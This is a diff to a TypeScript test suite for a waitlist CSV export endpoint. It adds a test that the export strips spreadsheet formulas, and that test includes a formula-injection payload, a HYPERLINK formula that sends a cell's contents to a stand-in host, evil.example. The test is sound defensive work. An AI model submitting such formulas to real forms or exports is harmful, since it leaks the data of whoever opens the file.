@@ -17,7 +17,7 @@ const rig = async (opts: { origins?: string[]; rpm?: number } = {}) => {
     webhook_url: null, webhook_secret: null, low_balance_pct: 20,
   });
   const app = buildApp({
-    store, clock, rng: new SeededRng('wl'), tenantRps: 0, subjectRps: 0,
+    store, clock, tenantRps: 0, subjectRps: 0,
     waitlistOrigins: opts.origins ?? ['https://tegata.ai'],
     waitlistRpm: opts.rpm ?? 0,
   });
@@ -239,11 +239,37 @@ describe('reading the list back', () => {
     expect(res.statusCode).toBe(200);
     expect(res.headers['content-type']).toContain('text/csv');
 
-    const lines = res.body.trim().split('\n');
+    // RFC 4180 rows, so CRLF rather than LF.
+    const lines = res.body.trimEnd().split('\r\n');
     expect(lines[0]).toBe('id,email,source,locale,created_at');
     expect(lines).toHaveLength(3);
     expect(res.body).toContain('"we""ird@example.com"');
     expect(res.body).toContain('"a,b"');
+    await r.close();
+  });
+
+  /**
+   * The export is opened in a spreadsheet by the person holding the key, and two of its
+   * columns arrive from an unauthenticated form on a public page. A cell beginning with
+   * `=` is a formula, and it runs as them when the file opens.
+   */
+  it('hands the spreadsheet no formulas, whatever was submitted', async () => {
+    const r = await rig();
+    const attack = '=HYPERLINK("https://evil.example/"&A1,"click")';
+    // Straight through the public route, exactly as a stranger would send it.
+    await r.post({ email: 'x@example.com', source: attack, locale: attack });
+    // And directly in the store, for the fields the route does not police.
+    r.store.addToWaitlist({ emailHash: 'h9', email: '-founder@example.com', source: '+1', locale: '@x', note: null });
+
+    const res = await r.app.inject({ method: 'GET', url: '/v1/waitlist/export',
+      headers: { authorization: `Bearer ${KEY}` } });
+
+    // No cell in the file starts a formula: not at the start of a line, not after a
+    // delimiter, and not inside the quotes either.
+    expect(res.body).not.toMatch(/(^|[\r\n,])"?[=+\-@]/);
+    // The route refused the submitted tag outright rather than storing and escaping it.
+    expect(res.body).toContain('site');
+    expect(res.body).not.toContain('HYPERLINK');
     await r.close();
   });
 
